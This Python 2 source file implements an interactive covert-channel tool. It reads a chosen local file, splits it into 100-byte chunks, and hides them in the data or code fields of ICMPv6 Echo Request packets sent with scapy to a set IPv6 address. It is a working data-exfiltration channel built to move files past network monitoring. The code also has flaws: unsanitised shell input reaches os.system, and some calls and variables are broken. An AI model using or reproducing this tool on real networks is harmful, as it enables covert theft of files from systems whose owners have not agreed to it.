#!/usr/bin/python

import sys
import re, uuid
import os
import readline
from pprint import pprint
from commands import *
from scapy.all import *
from receiver import *


"""
class for Echo Request Covert Channels
"""
class EchoRequest:

    def __init__(self):
        self.field = ''
        self.fieldContent = ''
        self.fields =['code', 'identifier', 'seqNum', 'data']
        self.name = 'EchoReqCovert'
        self.ipAddress = 'fe80::ad4:cff:fe13:7667'
        self.fileToSend = ''
        self.fileName = ''
        self.sendingBuffer = []
        self.maxPacketSize = 100

    #starts the interactive propmt
    def startSystem(self):
        Commands.setEchoRequestCovertHistory()
        running = 1
        while running:
            readline.parse_and_bind("tab: complete")
            #we receive data from the keyboard                    
            command  = raw_input(self.name + ' >>')
            #help command
            if re.match("help", command):
                self.showHelp()
            #quit module command
            elif re.match("quit", command):
                running = 0
                Commands.setCovertChannelHistory()
            elif re.match('setAdr', command):
                self.ipAddress = re.sub('setAdr', ' ', command).lstrip()
                print 'setting Ip address: ' + self.ipAddress
            elif re.match('iface', command):
                self.interface = re.sub('iface', ' ', command).lstrip()
                print 'setting interface: ' + self.interface
            elif re.match('code', command):
                self.field = 'code'
                self.fieldContent = re.sub('code', ' ', command).lstrip()
                print self.fieldContent
            elif re.match('data', command):
                self.field = 'data'
                self.fieldContent = re.sub('data', ' ', command).lstrip()
                print self.fieldContent            
            elif re.match('rec', command):
                self.receiver()
            elif re.match('exec', command):
                self.execModule()
            elif re.match('show', command):
                self.buildPacket()
                #self.showAttributes()
            elif re.match("shell", command):
                shell = 1
                Commands.setShellHistory()
                while shell:
                    c = raw_input('$')
                    if re.match("help", c):
                        self.showShellHelp()
                    elif re.match("quit", c):
                        shell = 0
                        Commands.setMainHistory()
                    elif re.match(r'ls$', c):
                        files = os.listdir('.')
                        for f in files:
                            print f
                    elif re.match(r'ls -l', c):
                        files = os.system(c)
                        print files
                    elif re.match('cd', c):
                        path = re.sub('cd', ' ', c)
                        try:
                            os.chdir(path.strip())
                        except:
                            print 'Error! Wrong path!'
                    elif re.match('select', c):
                        path  = re.sub('select', ' ', c)
                        data = open(path.strip(), 'rb')
                        self.fileToSend = data.read()
                        data.close()
                        self.fileName = path.strip()
                    else:
                        print 'Error! Command not found!'
            else:
                print 'Error! Command not found!'

    def showHelp(self):
        for entry in Help.getEchoRequestHelp():
            print entry

    def showShellHelp(self):
        for entry in Help.getShellHelp():
            print entry

    def showAttributes(self):
        attributes = [self.field]
        for entry in attributes:
            if entry:
                print entry
            else:
                print 'None'

    def buildPacket(self, chunk):
        if re.match('data', self.field):
            self.packet = IPv6(dst=self.ipAddress)/ICMPv6EchoRequest(data=chunk)
        if re.match('code', self.field):
            self.packet = IPv6(dst=self.ipAddress)/ICMPv6EchoRequest(code=chunk)
        #print self.packet.show()
        
    def execModule(self):
        self.chunkPackets(self.fileToSend)
        for chunk in self.sendingBuffer:
            self.buildPacket(chunk)
            send(self.packet, iface='wlan0')
        self.sendingBuffer = []

    def receiver(self):
        rec = Receiver()
        rec.receive()

    def chunkPackets(self, data):
        print '[*] size of file %d' % len(data)
        if len(data) <= self.maxPacketSize:
            self.sendingBuffer.append(data)
        else:
            chunksNumber = int(len(data)/self.maxPacketSize)
            chunks = [data[i:i+self.maxPacketSize] for i in range(0, len(data), self.maxPacketSize)]
            chunkNumber = 0
            for entry in chunks:
                self.sendingBuffer.append(entry)
                chunkNumber += 1
        print '[*] chunks %d' % chunkNumber
